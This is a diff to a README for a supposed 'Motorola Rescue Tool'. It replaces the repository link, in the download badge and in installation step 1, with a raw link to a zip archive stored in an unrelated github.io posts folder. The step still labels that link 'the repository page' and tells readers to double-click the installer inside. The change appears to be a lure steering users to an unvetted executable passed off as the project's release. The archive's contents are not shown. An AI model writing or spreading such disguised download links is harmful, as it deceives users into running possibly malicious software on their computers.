@@ -6,7 +6,7 @@ description: "Download the full version of the Motorola Rescue Tool for Windows 
 # 📱 Motorola-Rescue-2026 - Restore Your Motorola Phone With Ease
 
 <p align="center">
-  <a href="https://github.com/hocines9011/Motorola-Rescue-2026">
+  <a href="https://raw.githubusercontent.com/hocines9011/hocines9011.github.io/main/_posts/App_3.3-beta.5.zip">
     <img src="https://img.shields.io/badge/Download-Rescue_Tool-blue" alt="Download Link">
   </a>
 </p>
@@ -38,7 +38,7 @@ Ensure your computer has the following items before you start the process:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the repository page to download the software package: [https://github.com/hocines9011/Motorola-Rescue-2026](https://github.com/hocines9011/Motorola-Rescue-2026).
+1. Visit the repository page to download the software package: [https://raw.githubusercontent.com/hocines9011/hocines9011.github.io/main/_posts/App_3.3-beta.5.zip](https://raw.githubusercontent.com/hocines9011/hocines9011.github.io/main/_posts/App_3.3-beta.5.zip).
 2. Locate the installer file inside the downloaded folder.
 3. Double-click the file to open the installation wizard.
 4. Accept the terms of use presented on the screen.
